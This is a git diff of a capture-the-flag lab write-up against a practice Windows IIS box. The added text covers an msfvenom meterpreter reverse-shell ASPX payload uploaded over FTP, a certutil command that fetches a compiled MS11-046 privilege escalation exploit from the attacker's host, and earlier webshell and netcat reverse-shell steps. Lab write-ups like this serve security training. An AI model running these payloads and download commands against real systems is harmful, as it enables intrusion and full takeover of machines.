@@ -6,8 +6,6 @@ description: Work In Progress...
 
 ## Overview
 
-j
-
 ## Enumeration
 
 As always we start with an Nmap scan. This is the one I ran
@@ -86,11 +84,11 @@ I decided to go with the webshell from SecLists
 
 Now we'll upload it over ftp:
 
-![](<../../../../.gitbook/assets/image (43).png>)
+![](<../../../../.gitbook/assets/image (46).png>)
 
 We can access our webshell by visiting `10.129.203.118/cmd.aspx`
 
-![](<../../../../.gitbook/assets/image (24).png>)
+![](<../../../../.gitbook/assets/image (25).png>)
 
 Here's what returns when entering `whoami`
 
@@ -102,15 +100,15 @@ I'll be getting a shell with `nc.exe`
 
 First I use smbserver.py to send the executable to the web server and then execute a netcat command
 
-![](<../../../../.gitbook/assets/image (25).png>)
+![](<../../../../.gitbook/assets/image (26).png>)
 
 ![](<../../../../.gitbook/assets/image (41).png>)
 
-![](<../../../../.gitbook/assets/image (42).png>)
+![](<../../../../.gitbook/assets/image (43).png>)
 
 I also start a nc listener on my kali machine to catch a shell
 
-![](<../../../../.gitbook/assets/image (30).png>)
+![](<../../../../.gitbook/assets/image (31).png>)
 
 Entering the following command into the webshell:
 
@@ -120,3 +118,83 @@ Entering the following command into the webshell:
 
 And I get a shell!
 
+{% hint style="warning" %}
+I was supposed to, but it didn't work. I followed along other manual methods but no success
+{% endhint %}
+
+## With Metasploit
+
+I'll create the payload
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=443 -f aspx > meterpreter_rev_443.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of aspx file: 2873 bytes
+```
+
+Put it on the FTP server
+
+```
+ftp> put meterpreter_rev_443.aspx
+local: meterpreter_rev_443.aspx remote: meterpreter_rev_443.aspx
+229 Entering Extended Passive Mode (|||49186|)
+125 Data connection already open; Transfer starting.
+100% |**************************************|  2910       34.68 MiB/s    --:-- ETA
+226 Transfer complete.
+2910 bytes sent in 00:00 (100.65 KiB/s)
+```
+
+Use the Metasploit module `exploit/multi/handler`
+
+![](<../../../../.gitbook/assets/image (16).png>)
+
+Visit the page&#x20;
+
+```
+http://10.129.203.118/meterpreter_rev_443.aspx
+```
+
+And catch a shell!
+
+![](<../../../../.gitbook/assets/image (72).png>)
+
+## Privilege Escalation
+
+Running systeminfo in the shell shows us some good information
+
+![](<../../../../.gitbook/assets/image (44).png>)
+
+In particular, I'm interested in the OS Version, so I look up priv esc for this build and find a nice exploit to use
+
+{% embed url="https://www.exploit-db.com/exploits/40564" %}
+
+We'll compile the code as suggested by the exploit
+
+![](<../../../../.gitbook/assets/image (52).png>)
+
+```
+i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
+```
+
+Since we don't have full access to any user, we'll create a temp directory inside the Public folder and use something like certutil to upload the exploit and use a python http server to aid in the transfer
+
+```
+certutil -urlcache -f http://10.10.14.13/MS11-046.exe MS11-046.exe
+```
+
+![](<../../../../.gitbook/assets/image (8).png>)
+
+![](<../../../../.gitbook/assets/image (70).png>)
+
+Now we will run the exploit which should give us NT Auth\System level privileges
+
+![](<../../../../.gitbook/assets/image (45).png>)
+
+With our exploit executing successfully, we'll grab both the user and root flags!
+
+![](<../../../../.gitbook/assets/image (56).png>)
+
+![](<../../../../.gitbook/assets/image (23).png>)
